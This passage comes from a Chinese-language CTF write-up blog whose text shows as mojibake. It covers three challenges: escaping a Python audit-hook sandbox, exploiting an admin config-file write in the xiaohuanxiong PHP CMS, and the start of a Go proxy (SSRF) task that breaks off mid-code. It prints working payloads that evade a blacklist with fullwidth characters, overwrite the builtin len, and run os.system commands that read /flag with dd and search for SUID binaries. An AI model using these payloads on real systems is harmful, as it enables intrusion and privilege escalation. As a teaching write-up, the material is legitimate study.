</span></span><br><span class="line"><span class="string">        # éå†é»‘åå•åˆ—è¡¨ã€‚  </span></span><br><span class="line"><span class="string">        if bad in event_name:  </span></span><br><span class="line"><span class="string">            # æ£€æŸ¥äº‹ä»¶åç§°æ˜¯å¦åŒ…å«é»‘åå•ä¸­çš„ä»»ä½•å­—ç¬¦ä¸²ã€‚  </span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)  </span></span><br><span class="line"><span class="string">    # å¦‚æœäº‹ä»¶åç§°åŒ…å«é»‘åå•ä¸­çš„å­—ç¬¦ä¸²ï¼Œåˆ™æŠ›å‡ºè¿è¡Œæ—¶é”™è¯¯ã€‚  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)  </span></span><br><span class="line"><span class="string"># ä½¿ç”¨__import__å‡½æ•°åŠ¨æ€å¯¼å…¥sysæ¨¡å—ï¼Œå¹¶è°ƒç”¨å…¶addaudithookæ–¹æ³•æ³¨å†Œå®¡è®¡é’©å­å‡½æ•°ã€‚  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>  </span><br><span class="line">    <span class="comment"># å¤šè¡Œå­—ç¬¦ä¸²ç»“æŸï¼Œæ­¤æ—¶hook_codeå˜é‡åŒ…å«äº†ä¸Šè¿°å®¡è®¡é’©å­å‡½æ•°çš„å®šä¹‰å’Œæ³¨å†Œä»£ç ã€‚  </span></span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(source_code)  </span><br><span class="line">    <span class="comment"># æ‰“å°ä¼ å…¥çš„æºä»£ç å­—ç¬¦ä¸²ï¼Œè¿™åœ¨è°ƒè¯•æ—¶å¯èƒ½æœ‰ç”¨ï¼Œä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¯èƒ½æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚  </span></span><br><span class="line">  </span><br><span class="line">    code = hook_code + source_code  </span><br><span class="line">    <span class="comment"># å°†å®¡è®¡é’©å­ä»£ç å’Œä¼ å…¥çš„æºä»£ç æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ªå®Œæ•´çš„Pythonè„šæœ¬ã€‚  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># æ³¨æ„ï¼šä¸‹é¢è¿™è¡Œä»£ç å®é™…ä¸Šå¹¶æ²¡æœ‰åœ¨åç»­é€»è¾‘ä¸­ä½¿ç”¨treeå˜é‡ã€‚  </span></span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)  </span><br><span class="line">    <span class="comment"># ä½¿ç”¨compileå‡½æ•°å°è¯•å°†æºä»£ç ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œä½†å®é™…ä¸Šç”±äºæŒ‡å®šäº†ast.PyCF_ONLY_ASTæ ‡å¿—ï¼Œ  </span></span><br><span class="line">    <span class="comment"># è¿™è¡Œä»£ç ä¼šè¿”å›ä¸€ä¸ªASTï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰å¯¹è±¡è€Œä¸æ˜¯å­—èŠ‚ç ã€‚ç„¶è€Œï¼Œè¿™ä¸ªASTå¯¹è±¡å¹¶æ²¡æœ‰è¢«åç»­ä»£ç ä½¿ç”¨ã€‚  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        <span class="comment"># å°è¯•æ‰§è¡Œä»¥ä¸‹ä»£ç å—ã€‚  </span></span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):  </span><br><span class="line">            <span class="comment"># è°ƒç”¨ä¸€ä¸ªåä¸ºverify_secureçš„å‡½æ•°ï¼Œä¼ å…¥ä¹‹å‰ç¼–è¯‘å¾—åˆ°çš„ASTå¯¹è±¡ï¼ˆå°½ç®¡è¿™ä¸ªå¯¹è±¡å¹¶æ²¡æœ‰çœŸæ­£è¢«ä½¿ç”¨ï¼‰ã€‚  </span></span><br><span class="line">            <span class="comment"># æ³¨æ„ï¼šverify_secureå‡½æ•°æ²¡æœ‰åœ¨ä»£ç ä¸­å®šä¹‰ï¼Œå› æ­¤è¿™æ®µä»£ç åœ¨å®é™…è¿è¡Œæ—¶ä¼šæŠ›å‡ºNameErrorã€‚  </span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                <span class="comment"># æ‰“å¼€ï¼ˆæˆ–åˆ›å»ºï¼‰ä¸€ä¸ªåä¸ºrun.pyçš„æ–‡ä»¶ï¼Œå¹¶å‡†å¤‡å†™å…¥å†…å®¹ã€‚  </span></span><br><span class="line">                f.write(code)  </span><br><span class="line">            <span class="comment"># å°†ä¹‹å‰æ‹¼æ¥å¥½çš„ä»£ç å†™å…¥run.pyæ–‡ä»¶ã€‚  </span></span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)  </span><br><span class="line">            <span class="comment"># ä½¿ç”¨subprocessæ¨¡å—è¿è¡Œrun.pyè„šæœ¬ï¼Œæ•è·å…¶æ ‡å‡†è¾“å‡ºï¼Œå¹¶å°è¯•å°†è¾“å‡ºè§£ç ä¸ºUTF-8å­—ç¬¦ä¸²ã€‚  </span></span><br><span class="line">            <span class="comment"># è¿™é‡Œè¿˜è®¾ç½®äº†ä¸€ä¸ª5ç§’çš„è¶…æ—¶æ—¶é—´ã€‚  </span></span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)  </span><br><span class="line">            <span class="comment"># åˆ é™¤run.pyæ–‡ä»¶ï¼Œæ¸…ç†æ‰§è¡Œç¯å¢ƒã€‚  </span></span><br><span class="line">            <span class="keyword">return</span> result  </span><br><span class="line">        <span class="comment"># å¦‚æœverify_secureå‡½æ•°è¿”å›Trueï¼ˆè¡¨ç¤ºä»£ç è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼‰ï¼Œåˆ™æ‰§è¡Œä¸Šè¿°ä»£ç å—å¹¶è¿”å›æ‰§è¡Œç»“æœã€‚  </span></span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="comment"># å¦‚æœä»£ç è¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„ï¼Œåˆ™è¿”å›ä¸€æ¡æ¶ˆæ¯è¡¨ç¤ºæ‰§è¡Œè¢«ä¸­æ­¢ã€‚  </span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span>  </span><br><span class="line">    <span class="keyword">except</span>:  </span><br><span class="line">        <span class="comment"># æ•è·æ‰€æœ‰å¼‚å¸¸ï¼ˆè¿™æ˜¯ä¸€ä¸ªä¸æ¨èçš„åšæ³•ï¼Œå› ä¸ºå®ƒä¼šæ•è·åŒ…æ‹¬ç¼–ç¨‹é”™è¯¯åœ¨å†…çš„æ‰€æœ‰å¼‚å¸¸ï¼‰ã€‚  </span></span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)  </span><br><span class="line">        <span class="comment"># æ— è®ºå‘ç”Ÿä»€ä¹ˆå¼‚å¸¸ï¼Œéƒ½å°è¯•åˆ é™¤run.pyæ–‡ä»¶ã€‚  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span>  </span><br><span class="line">    <span class="comment"># å¦‚æœå‘ç”Ÿå¼‚å¸¸ï¼Œåˆ™è¿”å›ä¸€æ¡å¯èƒ½è¯¯å¯¼çš„æ¶ˆæ¯ï¼ˆ&quot;Timeout!&quot;ï¼‰ï¼Œå³ä½¿å¼‚å¸¸çš„åŸå› å¯èƒ½å¹¶ä¸æ˜¯è¶…æ—¶ã€‚</span></span><br></pre></td></tr></table></figure><p>â€‹å¤§æ¦‚å°±è¿™äº›äº†ï¼Œå…ˆåšä¸ªæµ‹è¯•å§ï¼ŒåŠè§’å½¢å¼ä¼¼ä¹èƒ½ç»•è¿‡ç¬¦å·æ­£åˆ™åŒ¹é…ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;blocks&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;languageVersion&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;blocks&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;text&quot;</span><span class="punctuation">,</span><span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;TEXT&quot;</span><span class="punctuation">:</span><span class="string">&quot;ï¼‡ï¼›ï½ï½’ï½‰ï½ï½”ï¼ˆï½ï½ï½…ï½ï¼ˆï¼‚ï¼ï½…ï½”ï½ƒï¼ï½ï½ï½“ï½“ï½—ï½„ï¼‚ï¼‰ï¼ï½’ï½…ï½ï½„ï¼ˆï¼‰ï¼‰ï¼ƒ&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹æ ¹æ®ä¸Šé¢çš„ç»•è¿‡æ²™ç®±æ–¹å¼ï¼Œè¿™é‡Œå¯ä»¥è®© len æ°¸ä¹…æ€§å°äº 1ï¼Œå°±æ˜¯é‡å†™å†…ç½®å‡½æ•° lenï¼Œæ„é€ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;__import__(&#x27;</span>sys<span class="string">&#x27;).modules[&#x27;</span>__main__<span class="string">&#x27;].__dict__[&#x27;</span>__builtins__<span class="string">&#x27;].__dict__[&#x27;</span><span class="built_in">len</span><span class="string">&#x27;] = lambda x: 1</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±æ˜¯è¯» flag äº†ï¼š<span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZGQvJUVGJUJDJThDJUU5JTlDJTgwJUU4JUE2JTgxJUU3JTk0JUE4JUU1JTg4JUIwJUU4JUJGJTk5JUU0JUI4JUFBJUVGJUJDJThDJUU0JUI4JThEJUU4JUJGJTg3JUU0JUI4JThEJUU3JTlGJUE1JUU5JTgxJTkzJUU1JTg1JUI3JUU0JUJEJTkzJUU1JThFJTlGJUU3JTkwJTg2JUVGJUJDJThDJUU0JUJDJUIwJUU2JTkxJUI4JUU3JTlEJTgwJUU1JUJBJTk0JUU4JUFGJUE1JUU2JTk4JUFGJUU2JThGJTkwJUU2JTlEJTgzJUVGJUJDJThDJUU2JUFGJTk1JUU3JUFCJTlGJUU2JUIyJTk5JUU3JUFFJUIxJUU1JThGJUFGJUU4JTgzJUJEJUU2JUIyJUExJUU2JTlDJTg5JUU2JTlEJTgzJUU5JTk5JTkwJUVGJUJDJTg4JUU3JThDJTlDJUU3JTlBJTg0JUVGJUJDJThDJUU1JThGJUFGJUU4JTgzJUJEJUU0JUI4JThEJUU1JUFGJUI5JUVGJUJDJTg5JUUzJTgwJTgy">https://gtfobins.github.io/gtfobins/dd/ï¼Œéœ€è¦ç”¨åˆ°è¿™ä¸ªï¼Œä¸è¿‡ä¸çŸ¥é“å…·ä½“åŸç†ï¼Œä¼°æ‘¸ç€åº”è¯¥æ˜¯ææƒï¼Œæ¯•ç«Ÿæ²™ç®±å¯èƒ½æ²¡æœ‰æƒé™ï¼ˆçŒœçš„ï¼Œå¯èƒ½ä¸å¯¹ï¼‰ã€‚</span></p><p>â€‹payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;__import__(&#x27;</span>sys<span class="string">&#x27;).modules[&#x27;</span>__main__<span class="string">&#x27;].__dict__[&#x27;</span>__builtins__<span class="string">&#x27;].__dict__[&#x27;</span><span class="built_in">len</span><span class="string">&#x27;] = lambda x: 1</span></span><br><span class="line"><span class="string">print(len(&quot;aaaaaa&quot;))</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span>ls<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span>LFILE=file_to_read dd <span class="keyword">if</span>=/flag<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span>find / -user root -perm -<span class="number">4000</span> -<span class="built_in">print</span> <span class="number">2</span>&gt;/dev/null<span class="string">&#x27;)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#æ”¹ä¸ºåŠè§’ï¼ŒåŠ ä¸Š\nï¼š</span></span><br><span class="line"><span class="string">ï¼‡ï¼›ï¼¿ï¼¿ï½‰ï½ï½ï½ï½’ï½”ï¼¿ï¼¿ï¼ˆï¼‡ï½“ï½™ï½“ï¼‡ï¼‰ï¼ï½ï½ï½„ï½•ï½Œï½…ï½“ï¼»ï¼‡ï¼¿ï¼¿ï½ï½ï½‰ï½ï¼¿ï¼¿ï¼‡ï¼½ï¼ï¼¿ï¼¿ï½„ï½‰ï½ƒï½”ï¼¿ï¼¿ï¼»ï¼‡ï¼¿ï¼¿ï½‚ï½•ï½‰ï½Œï½”ï½‰ï½ï½“ï¼¿ï¼¿ï¼‡ï¼½ï¼ï¼¿ï¼¿ï½„ï½‰ï½ƒï½”ï¼¿ï¼¿ï¼»ï¼‡ï½Œï½…ï½ï¼‡ï¼½ ï¼ ï½Œï½ï½ï½‚ï½„ï½ ï½˜ï¼š ï¼‘\nï½ï½’ï½‰ï½ï½”ï¼ˆï½Œï½…ï½ï¼ˆï¼‚ï½ï½ï½ï½ï½ï½ï¼‚ï¼‰ï¼‰\nï¼¿ï¼¿ï½‰ï½ï½ï½ï½’ï½”ï¼¿ï¼¿ï¼ˆï¼‡ï½ï½“ï¼‡ï¼‰ï¼ï½“ï½™ï½“ï½”ï½…ï½ï¼ˆï¼‡ï½Œï½“ï¼‡ï¼‰\nï¼¿ï¼¿ï½‰ï½ï½ï½ï½’ï½”ï¼¿ï¼¿ï¼ˆï¼‡ï½ï½“ï¼‡ï¼‰ï¼ï½“ï½™ï½“ï½”ï½…ï½ï¼ˆï¼‡ï¼¬ï¼¦ï¼©ï¼¬ï¼¥ï¼ï½†ï½‰ï½Œï½…ï¼¿ï½”ï½ï¼¿ï½’ï½…ï½ï½„ ï½„ï½„ ï½‰ï½†ï¼ï¼ï½†ï½Œï½ï½‡ï¼‡ï¼‰\nï¼¿ï¼¿ï½‰ï½ï½ï½ï½’ï½”ï¼¿ï¼¿ï¼ˆï¼‡ï½ï½“ï¼‡ï¼‰ï¼ï½“ï½™ï½“ï½”ï½…ï½ï¼ˆï¼‡ï½†ï½‰ï½ï½„ ï¼ ï¼ï½•ï½“ï½…ï½’ ï½’ï½ï½ï½” ï¼ï½ï½…ï½’ï½ ï¼ï¼”ï¼ï¼ï¼ ï¼ï½ï½’ï½‰ï½ï½” ï¼’ï¼ï¼ï½„ï½…ï½–ï¼ï½ï½•ï½Œï½Œï¼‡ï¼‰ï¼ƒ</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h2 id="xiaohuanxiong"><a class="markdownIt-Anchor" href="#xiaohuanxiong">#</a> xiaohuanxiongï¼š</h2><p>â€‹é¡¹ç›®åœ°å€ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZvcmthYmxlL3hpYW9odWFueGlvbmc=">https://github.com/forkable/xiaohuanxiong</span></p><p>â€‹å¼€å§‹å®¡è®¡ï¼š</p><p>â€‹å­˜åœ¨ admin æ–‡ä»¶å¤¹ï¼Œé‚£ä¼°è®¡æ´å¯èƒ½åœ¨ admin é‡Œé¢ï¼Œå…ˆçœ‹é‡Œé¢ï¼š</p><ol><li>Admins æœ‰åˆ›å»ºã€ç®¡ç†ã€åˆ é™¤ç®¡ç†å‘˜ç”¨æˆ·çš„åŠŸèƒ½ï¼Œæ¨æµ‹å¯èƒ½ä¼šæœ‰æ´ï¼Œä½†å®é™…ä¸Šå¹¶æ²¡æœ‰ç”¨åˆ°è¿™é‡Œã€‚</li><li>Areasã€Authorsã€Bannersã€BaseAdminã€Booksã€Chapters ä¸€ç›´åˆ° Login éƒ½æ²¡å•¥ç”¨ï¼Œå°±æ­£å¸¸çš„ç®¡ç†ç³»ç»Ÿ</li></ol><p>â€‹å½“çœ‹åˆ° Payment çš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€ä¸ªé‡è¦çš„ç‚¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ”¯ä»˜é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">isPost</span>()) &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;json&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="title class_">App</span>::<span class="title function_ invoke__">getRootPath</span>() . <span class="string">&#x27;config/payment.php&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;ä¿å­˜æˆåŠŸ&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="title class_">App</span>::<span class="title function_ invoke__">getRootPath</span>() . <span class="string">&#x27;config/payment.php&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;json&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">view</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¿å­˜é…ç½®æ–‡ä»¶ï¼Œå­˜åœ¨æ–‡ä»¶å†™å…¥çš„é—®é¢˜ï¼Œå†™å…¥çš„è¿˜æ˜¯ php æ–‡ä»¶ï¼Œä¹‹åè¿›å…¥ admin/payment çœ‹çœ‹ï¼Œå‘ç°äº†è¿™äº›ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5d7af358c0c44f88a3533e0b7ad15c01.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¿™é‡Œé¢å†™å…¥ payload å³å¯ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/fe6bfe2f95e64d48ad701b6676f12492.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹<img data-src="https://i-blog.csdnimg.cn/direct/fbe689cea973480aa83b960ff34ec977.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2db4c362-5f6f-4c81-b77e-d27ec7fcb6aa&#125;</span><br></pre></td></tr></table></figure><h2 id="proxy"><a class="markdownIt-Anchor" href="#proxy">#</a> proxyï¼š</h2><p>â€‹è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ªä½¿ç”¨ Gin æ¡†æ¶çš„ Go Web æœåŠ¡å™¨ï¼Œå®ƒæä¾›äº†ä¸¤ä¸ª API æ¥å£ï¼Œåˆ†åˆ«ä½äº  <code>/v1/api/flag</code>  å’Œ  <code>/v2/api/proxy</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ProxyRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">URL             <span class="type">string</span>            <span class="string">`json:&quot;url&quot; binding:&quot;required&quot;`</span></span><br><span class="line">Method          <span class="type">string</span>            <span class="string">`json:&quot;method&quot; binding:&quot;required&quot;`</span></span><br><span class="line">Body            <span class="type">string</span>            <span class="string">`json:&quot;body&quot;`</span></span><br><span class="line">Headers         <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;headers&quot;`</span></span><br><span class="line">FollowRedirects <span class="type">bool</span>              <span class="string">`json:&quot;follow_redirects&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line"></span><br><span class="line">v1 := r.Group(<span class="string">&quot;/v1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">v1.POST(<span class="string">&quot;/api/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;/readflag&quot;</span>)</span><br><span class="line">flag, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;flag&quot;</span>: flag&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v2 := r.Group(<span class="string">&quot;/v2&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">v2.POST(<span class="string">&quot;/api/proxy&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> proxyRequest ProxyRequest</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;proxyRequest); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client := &amp;http.Client&#123;</span><br><span class="line">CheckRedirect: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request, via []*http.Request)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> !req.URL.IsAbs() &#123;</span><br><span class="line"><span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !proxyRequest.FollowRedirects &#123;</span><br><span class="line"><span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req, err := http.NewRequest(proxyRequest.Method, proxyRequest.URL, bytes.NewReader([]<span class="type">byte</span>(proxyRequest.Body)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> proxyRequest.Headers &#123;</span><br><span class="line">req.Header.Set(key, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp, err := client.Do(req)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">body, err := io.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.Status(resp.StatusCode)</span><br><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> resp.Header &#123;</span><br><span class="line">c.Header(key, value[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.Writer.Write(body)</span><br><span class="line">c.Abort()</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">&quot;127.0.0.1:8769&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å…ˆçœ‹çœ‹ /v1/api/flagï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span 